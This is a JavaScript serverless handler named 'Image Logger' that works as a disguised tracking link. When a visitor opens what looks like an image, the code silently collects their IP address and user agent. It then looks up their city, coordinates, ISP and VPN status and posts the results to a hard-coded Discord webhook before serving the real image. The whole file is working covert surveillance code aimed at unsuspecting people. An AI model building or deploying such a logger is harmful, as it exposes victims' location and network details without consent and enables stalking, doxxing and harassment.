import fetch from "node-fetch";

const WEBHOOK_URL = "https://discord.com/api/webhooks/1348770175704629278/TOLB8mcoNonVzvVWNUH2fKU8yA4Htw6hRCsCXaLvBZ4H6AH1bI6PsFGYX0bLm992f_ew";
const IMAGE_URL = "https://cdn.discordapp.com/attachments/1302897043894829058/1397806335675994112/IMG__.jpg?ex=688d9c18&is=688c4a98&hm=df7ade58fcbf014b1f31f1edc522099b7279a00eb096daf937af2a4915fa63b0&";

async function getIPInfo(ip) {
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,as,proxy,hosting,lat,lon,timezone,mobile`);
    const data = await response.json();
    if (data.status === "fail") return null;
    return data;
  } catch {
    return null;
  }
}

export default async function handler(req, res) {
  const ip = req.headers['x-forwarded-for']?.split(",")[0].trim() || req.connection.remoteAddress || "Unknown";
  const userAgent = req.headers['user-agent'] || "Unknown";

  const ipInfo = await getIPInfo(ip);

  const embed = {
    title: "Image Logger - IP Logged",
    color: 0x00FFFF,
    description: `**User Opened the Original Image!**

**IP Info:**
> IP: \`${ip}\`
> ISP: \`${ipInfo?.isp || "Unknown"}\`
> ASN: \`${ipInfo?.as || "Unknown"}\`
> Country: \`${ipInfo?.country || "Unknown"}\`
> Region: \`${ipInfo?.regionName || "Unknown"}\`
> City: \`${ipInfo?.city || "Unknown"}\`
> Coordinates: \`${ipInfo ? `${ipInfo.lat}, ${ipInfo.lon}` : "Unknown"}\`
> Timezone: \`${ipInfo?.timezone || "Unknown"}\`
> Mobile: \`${ipInfo?.mobile || "Unknown"}\`
> VPN/Proxy: \`${ipInfo?.proxy || "False"}\`
> Hosting: \`${ipInfo?.hosting || "False"}\`

**User Agent:**
\`\`\`
${userAgent}
\`\`\`
`
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "Image Logger",
        embeds: [embed]
      }),
    });
  } catch (error) {
    console.error("Failed to send webhook:", error);
  }

  try {
    const imageResponse = await fetch(IMAGE_URL);
    const imageBuffer = await imageResponse.arrayBuffer();

    res.setHeader("Content-Type", "image/jpeg");
    res.status(200).send(Buffer.from(imageBuffer));
  } catch (error) {
    res.status(500).send("Failed to load image");
  }
}
